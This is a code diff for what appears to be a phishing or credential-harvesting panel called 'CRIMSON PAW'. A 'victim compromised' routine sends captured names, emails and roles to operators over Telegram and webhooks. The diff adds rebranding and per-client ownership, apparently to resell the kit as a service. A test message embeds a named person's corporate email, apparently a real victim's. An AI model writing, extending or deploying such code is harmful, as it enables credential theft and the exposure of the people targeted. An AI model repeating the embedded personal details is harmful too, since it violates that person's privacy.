+        if owner_id and not cfg.get('master_mirror_alerts', False):
+            return
+
         if not cfg.get('notify_token', True):
             return
 
-        # 1. Telegram Dispatch (Rich HTML)
+        # 2. Master Platform Telegram Dispatch (Rich HTML) - avoid duplicate if already dispatched to same chat
         bot_token = cfg.get('tg_bot_token', '').strip()
         chat_id = cfg.get('tg_chat_id', '').strip()
-        if bot_token and chat_id:
+        if bot_token and chat_id and (bot_token, chat_id) not in dispatched_targets:
+            dispatched_targets.add((bot_token, chat_id))
             import urllib.request
             payload = json.dumps({
                 'chat_id': chat_id,
                 'text': tg_html,
-                'parse_mode': 'HTML',
                 'disable_web_page_preview': True
             }).encode('utf-8')
             req = urllib.request.Request(
@@ -19751,16 +22022,17 @@ def _send_raw_alert(tg_html, wh_md, is_prt=False):
 
         # 2. Discord / Slack Webhook Dispatch
         wh_url = cfg.get('webhook_url', '').strip()
+        brand_name = cfg.get('platform_name', 'CRIMSON PAW').strip() or 'CRIMSON PAW'
         if wh_url:
             import urllib.request
             payload = json.dumps({
-                'username': 'CRIMSON PAW Alert',
+                'username': f'{brand_name} Alert',
                 'content': wh_md
             }).encode('utf-8')
             req = urllib.request.Request(
                 wh_url,
                 data=payload,
-                headers={'Content-Type': 'application/json', 'User-Agent': 'CrimsonPaw/2.0'}
+                headers={'Content-Type': 'application/json', 'User-Agent': f'{brand_name}/2.0'}
             )
             urllib.request.urlopen(req, timeout=10)
     except Exception as e:
@@ -19774,6 +22046,14 @@ def test_platform_telegram():
     if not bot_token or not chat_id:
         return jsonify({'success': False, 'error': 'Bot Token and Chat ID are both required'}), 400
     try:
+        cfg = {}
+        if SETTINGS_FILE.exists():
+            try:
+                with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
+                    cfg = json.load(f)
+            except Exception: pass
+        brand_name = cfg.get('platform_name', 'CRIMSON PAW').strip() or 'CRIMSON PAW'
+
         import urllib.request
         now = datetime.datetime.now()
         day = str(now.day)
@@ -19781,7 +22061,7 @@ def test_platform_telegram():
         time_str = now.strftime("%I:%M %p").lstrip("0")
         added_time = f"{day} {month} {time_str}"
         msg = (
-            "💎Crimson Paw office Result💎\n"
+            f"💎{brand_name} office Result💎\n"
             "👤Name: Lizbeth Lozoya\n"
             "📧Email: llozoya@solomon-arieh.com\n"
             "🎭Role: Member\n"
@@ -19812,14 +22092,22 @@ def test_platform_webhook():
     if not url:
         return jsonify({'success': False, 'error': 'Webhook URL required'}), 400
     try:
+        cfg = {}
+        if SETTINGS_FILE.exists():
+            try:
+                with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
+                    cfg = json.load(f)
+            except Exception: pass
+        brand_name = cfg.get('platform_name', 'CRIMSON PAW').strip() or 'CRIMSON PAW'
+
         import urllib.request
         payload = json.dumps({
-            'username': 'CRIMSON PAW Alert',
-            'content': '🧪 **CRIMSON PAW Test Alert**\nWebhook integration verified successfully from your CRIMSON PAW console.'
+            'username': f'{brand_name} Alert',
+            'content': f'🧪 **{brand_name} Test Alert**\nWebhook integration verified successfully from your {brand_name} console.'
         }).encode('utf-8')
         req = urllib.request.Request(url, data=payload, headers={
             'Content-Type': 'application/json',
-            'User-Agent': 'CrimsonPaw/2.0'
+            'User-Agent': f'{brand_name}/2.0'
         })
         with urllib.request.urlopen(req, timeout=8) as r:
             return jsonify({'success': True, 'status': r.status})
@@ -19968,9 +22256,18 @@ def dispatch_victim_compromised_alert(user_code):
         time_str = now.strftime("%I:%M %p").lstrip("0")
         added_time = f"{day} {month} {time_str}"
 
+        # Read platform brand name
+        cfg_plat = {}
+        if SETTINGS_FILE.exists():
+            try:
+                with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
+                    cfg_plat = json.load(f)
+            except Exception: pass
+        brand_name = cfg_plat.get('platform_name', 'CRIMSON PAW').strip() or 'CRIMSON PAW'
+
         # Exact 8-line layout matching user specification
         tg_html = (
-            f"💎Crimson Paw {service_label} Result💎\n"
+            f"💎{brand_name} {service_label} Result💎\n"
             f"👤Name: {html_escape(name)}\n"
             f"📧Email: {html_escape(email)}\n"
             f"🎭Role: {html_escape(role)}\n"
@@ -19981,7 +22278,7 @@ def dispatch_victim_compromised_alert(user_code):
         )
 
         wh_md = (
-            f"💎**Crimson Paw {service_label} Result**💎\n"
+            f"💎**{brand_name} {service_label} Result**💎\n"
             f"👤Name: {name}\n"
             f"📧Email: {email}\n"
             f"🎭Role: {role}\n"
@@ -19991,24 +22288,34 @@ def dispatch_victim_compromised_alert(user_code):
             f"🕐Added Time: {added_time}"
         )
 
-        _send_raw_alert(tg_html, wh_md, is_prt=False)
+        # NOTE: s is a sqlite3.Row (no .get()); guard for older schemas without owner_id.
+        _owner = s['owner_id'] if 'owner_id' in s.keys() else None
+        _send_raw_alert(tg_html, wh_md, is_prt=False, owner_id=_owner)
     except Exception as e:
         logger.error(f"dispatch_victim_compromised_alert error: {e}")
 
-def dispatch_alert(title, message, is_prt=False):
+def dispatch_alert(title, message, is_prt=False, owner_id=None):
     """Fallback generic rich alert dispatcher."""
+    cfg_plat = {}
+    if SETTINGS_FILE.exists():
+        try:
+            with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
+                cfg_plat = json.load(f)
+        except Exception: pass
+    brand_name = cfg_plat.get('platform_name', 'CRIMSON PAW').strip() or 'CRIMSON PAW'
+
     now_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     safe_title = html_escape(title)
     safe_msg = html_escape(message).replace('\n', '<br>')
     tg_html = (
-        f"🐾 <b>CRIMSON PAW</b> | <b>{safe_title}</b>\n"
+        f"🐾 <b>{brand_name}</b> | <b>{safe_title}</b>\n"
         "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"{safe_msg}\n\n"
         f"🕒 <code>{now_str}</code>\n"
         "━━━━━━━━━━━━━━━━━━━━━━━━━━"
     )
-    wh_md = f"🐾 **CRIMSON PAW | {title}**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n{message}\n🕒 `{now_str}`"
-    _send_raw_alert(tg_html, wh_md, is_prt=is_prt)
+    wh_md = f"🐾 **{brand_name} | {title}**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n{message}\n🕒 `{now_str}`"
+    _send_raw_alert(tg_html, wh_md, is_prt=is_prt, owner_id=owner_id)
 
 
 @app.route('/api/backup/export', methods=['GET'])
@@ -20023,7 +22330,11 @@ def purge_expired_sessions():
     try:
         conn = sqlite3.connect(Config.DB_PATH)
         cur = conn.cursor()
-        cur.execute("DELETE FROM sessions WHERE status IN ('EXPIRED', 'TERMINATED')")
+        owner_id = session.get('client_id') if session.get('is_client_admin') else None
+        if owner_id is not None:
+            cur.execute("DELETE FROM sessions WHERE status IN ('EXPIRED', 'TERMINATED') AND owner_id = ?", (owner_id,))
+        else:
+            cur.execute("DELETE FROM sessions WHERE status IN ('EXPIRED', 'TERMINATED')")
         purged = cur.rowcount
         conn.commit()
         conn.close()
@@ -20034,7 +22345,8 @@ def purge_expired_sessions():
 @app.route('/api/sessions/purge-inactive', methods=['POST'])
 def purge_inactive_sessions_route():
     try:
-        deleted = db.purge_inactive_sessions()
+        owner_id = session.get('client_id') if session.get('is_client_admin') else None
+        deleted = db.purge_inactive_sessions(owner_id=owner_id)
         return jsonify({'success': True, 'deleted': deleted})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)}), 500
